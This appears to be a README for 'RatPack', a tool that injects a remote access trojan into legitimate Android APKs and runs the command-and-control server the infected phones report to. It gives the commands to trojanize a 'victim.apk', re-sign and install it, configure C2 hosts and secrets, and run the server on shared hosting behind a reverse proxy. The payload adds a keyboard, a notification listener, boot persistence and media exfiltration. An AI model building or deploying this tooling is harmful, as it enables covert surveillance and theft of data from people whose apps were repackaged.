# RatPack

An APK recompiler with easy C2 server configuration.

RatPack injects a RAT payload into an existing APK, rewrites the payload's
server address and secret from a `setting.json` file, and rebuilds and re-signs
the result. The `setting.json` is generated by the Ratpack server panel, so the
server address never has to be typed into the compiler by hand.

```
   ┌───────────────────┐   /setting.json    ┌───────────────────┐   ./compile.sh    ┌──────────────┐
   │  RatPack Server   │ ─────────────────► │ RatPack Compiler  │ ───────────────► │   repacked   │
   │  (branch: server) │    (download)      │  (branch: main)   │                  │    .apk      │
   │                   │                    │                   │                  │              │
   │  C2 + web panel   │ ◄───────────────── │  setting.json     │ ◄─── bots ───── │  connects to │
   └───────────────────┘     bots connect   └───────────────────┘                  └──────────────┘
```

# Part 1 — the compiler (`main` branch)

## Requirements

| Tool | Version | Notes |
|---|---|---|
| JDK | 17 or 21 | `javac`, `java` on PATH |
| Android SDK | platform 35, build-tools 34.0.0 | `ANDROID_HOME` set |
| Python | 3.9+ | standard library only |
| apktool | 3.x | the bundled `ratpack/apktool.sh` wrapper finds it |
| Android SDK build-tools | — | `zipalign` + `apksigner` for signing |

`gradle` is optional — the compiler builds the payload with `gradle` if it is
on PATH, otherwise it expects `./Compiler/payload/gradlew`.

Point the build at your SDK:

```bash
echo "sdk.dir=/path/to/android-sdk" > Compiler/payload/local.properties
```

## Configure the server

The compiler reads `Compiler/setting.json`. Download it from your running
server panel:

```bash
# log in first
curl -c cookies.txt -X POST \
     -d "username=admin&password=YOUR_PASSWORD" \
     http://127.0.0.1:8080/login

# download the configuration
curl -b cookies.txt -o Compiler/setting.json \
     http://127.0.0.1:8080/setting.json
```

It looks like this:

```json
{
  "version": 1,
  "generated_by": "Ratpack Panel",
  "generated_at": "2026-11-10T23:59:15Z",
  "server": {
    "host": "10.0.2.2",
    "port": 8777,
    "protocol": "tcp",
    "secret": "YOUR_SHARED_SECRET",
    "beacon_ms": 15000,
    "timeout_ms": 10000,
    "tag": "rat"
  }
}
```

If the file is missing the compiler falls back to command-line flags
(`--c2-host`, `--c2-port`, `--secret`), but the panel route is the intended one.

## Compile

```bash
cd Compiler
./compile.sh victim.apk                      # -> victim.repacked.apk
./compile.sh victim.apk -o out/repacked.apk
./compile.sh victim.apk --setting /path/to/setting.json
./compile.sh --rebuild-payload victim.apk     # rebuild the payload first
```

Expected output:

```
  [*] configuration: .../Compiler/setting.json
  [*] payload: .../Compiler/payload/app/build/outputs/apk/debug/app-debug.apk
  [*] loaded setting.json from .../Compiler/setting.json
  [*] decoding victim.apk
  [*] copied 1081 payload smali files into smali
  [*] manifest: added 24 permissions, RAT service/IME/receiver
  [*] copied res/xml/method.xml
  [*] wrote assets/setting.json (from .../setting.json): host=10.0.2.2 port=8777 protocol=tcp
  [*] patched RatCfg: host=10.0.2.2 port=8777 secret='...' beacon=15000ms timeout=10000ms tls=False
  [*] rebuilding apk with apktool
  [*] signed with ~/.android/debug.keystore and zipaligned

[+] output: victim.repacked.apk (5493871 bytes)
[+] setting.json source: panel
```

## Signing

By default the APK is signed with the standard Android debug keystore
(`~/.android/debug.keystore`). For your own key:

```bash
keytool -genkeypair -v -keystore my.keystore -storepass PASS -keypass PASS \
        -alias mykey -keyalg RSA -keysize 2048 -validity 10000

./compile.sh victim.apk --keystore my.keystore --ks-pass PASS \
                        --key-alias mykey --key-pass PASS
```

## Install

```bash
adb install -r victim.repacked.apk
adb shell am start -n <victim.package>/<launcher.Activity>
```

The payload's `RatProvider` starts the service as soon as the victim app's
process starts, so there is nothing else to launch. The bot then registers with
the server and shows up in the panel.

## What the compiler does

1. `apktool d` the victim APK and the payload APK
2. copy the payload's smali into the victim's tree
   (the package is renamed to `com/darkbiit/ratpayload` on a name collision)
3. add the permissions and the RAT components to the victim's manifest:
   `RatService` (own process `:rat`), `RatProvider`, `RatBootReceiver`,
   `RatIme`, `RatNotificationListener`
4. copy `res/xml/method.xml` (the IME metadata the manifest points at)
5. write `assets/setting.json` into the APK
6. patch the payload's `RatCfg` smali with the server address, port, secret
   and timings
7. `apktool b` → `zipalign` → `apksigner sign`

Re-signing invalidates the original signature, so the result will not pass
Play Integrity and has to be installed from outside the Play Store.

# Part 2 — the server (`server` branch)

```bash
git clone -b server https://github.com/AGlegendery/RatPack.git RatPack-Server
cd RatPack-Server
pip install -r requirements.txt
python3 setup.py
```

The setup wizard asks which interface to deploy:

```
  Which interface do you want to deploy?

    [1] Bot interface
        Only the C2 data channel. Bots connect here, there is no
        browser UI. Use it on a headless box or when the panel
        is managed elsewhere.

    [2] Web interface
        The C2 plus the browser panel, and the setting.json
        generator that the Ratpack Compiler consumes.
```

It then asks for the bind address, the address the bots connect to, the port,
the transport (`tcp` or `tls`), the web credentials and the payload tuning.
On completion it prints the panel URL, the login, the shared secret and the
`setting.json` values.

Start it:

```bash
python3 -m ratpack.run     # web interface: C2 + browser panel
python3 -m ratpack.botd    # bot interface: C2 only
```

| Path | What |
|---|---|
| `/` | bot list and live event feed |
| `/bot/<id>` | per-bot console, command form, event log |
| `/setting.json` | the configuration document for the compiler |
| `/login`, `/logout` | session |
| `/healthz` | health check |

The configuration is stored in `panel_config.json`. It is generated by the
wizard and is **not** in the repository — keep it out of version control.

## Shared hosting / shared hardware

The default transport is a raw TCP socket: the server binds a port and the
bots connect to it. That needs a box where you control the ports — a VPS, a
home server, a container with published ports.

On **shared hosting** (cPanel/Plesk, Heroku-style dynos, Cloudflare-fronted
boxes) you usually cannot bind a port and have the outside world reach it.
You only get HTTP(S) on the port the platform assigns.

For that case the server offers an **HTTP long-polling transport**: the bot
polls for commands over ordinary HTTP and posts its frames back. Same
protocol, same panel, only the framing around the frames differs.

```
POST /bot/register        the bot announces itself
POST /bot/poll/{id}       long poll: returns a command, or 204 after the timeout
POST /bot/send/{id}       the bot returns a response or an event
```

### Choosing it

Run the wizard and pick option 2 for the transport:

```
  [1] Direct TCP   the server owns a port, bots connect straight to it
  [2] HTTP         shared hosting: the bots poll the panel over HTTP
```

Then give it the **public URL** of your panel, for example
`https://rat.example.com` — not `host:port`, and not `0.0.0.0`.

`setting.json` then carries it to the compiler:

```json
"server": {
  "host": "https://rat.example.com",
  "port": 8777,
  "protocol": "tcp",
  "transport": "http",
  "secret": "..."
}
```

The compiler bakes `transport: http` into the APK, and the payload switches
itself to the HTTP client.

### What it costs

- One long-poll request per bot per interval instead of one persistent
  socket. With the default 15 s beacon that is 4 requests a minute per bot.
- The poll holds a worker thread for the duration of the poll, so keep the
  poll timeout close to the beacon interval and cap the number of bots.
- Media-heavy commands (a photo, a video) are transferred as base64 inside
  the JSON response, which is much larger than the binary would be. Pulling
  files over HTTP is noticeably slower than over TCP.

### Running behind a reverse proxy

Any reverse proxy that can proxy HTTP works — nginx, Caddy, Apache. The
panel is a normal ASGI application.

```nginx
server {
    listen 443 ssl http2;
    server_name rat.example.com;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # The long poll must not be cut off before it answers.
        proxy_read_timeout 120s;
    }
}
```

If the proxy terminates TLS, the payload should talk to the public
`https://` URL. The panel's own TLS certificate is not what the bot sees in
that case — the proxy's is, and the payload trusts the system CA store plus
user-installed certificates.

### Process supervision on shared hosting

Shared hosting usually has no systemd. Run the panel under whatever the
platform provides — a supervisor config, a screen/tmux session, or the
hosting provider's "always-on worker" feature:

```bash
cd ~/RatPack-Server
./venv/bin/python -m ratpack.run
```

For a persistent background process without systemd:

```bash
nohup ./venv/bin/python -m ratpack.run >> ~/ratpack.log 2>&1 &
```

### Running the bot interface only

If you only want the C2 and not the browser panel, pick option 1 in the
wizard and start with:

```bash
python3 -m ratpack.botd
```

That one has no HTTP surface at all, so it also works where the panel
itself is not permitted.

# The protocol

The bot channel is a plain TCP (optionally TLS) stream with a 6-byte header:

```
+--------+--------+-----------------+------------------+
| ver(1) | type(1)| length (4 bytes) | payload (N bytes)|
+--------+--------+-----------------+------------------+
```

- `ver` = `0x01`
- `type`: `0x01` REGISTER, `0x02` REGISTER_ACK, `0x10` COMMAND,
  `0x11` RESPONSE, `0x12` EVENT, `0x20` PING, `0x21` PONG
- payload is UTF-8 JSON, except for PING/PONG

The Java implementation lives in
`Compiler/payload/app/src/main/java/com/darkbiit/rat/RatProto.java` and the
Python mirror in `ratpack/protocol.py` (server branch). They must stay
byte-identical; `RatProtoConformance.java` checks that.
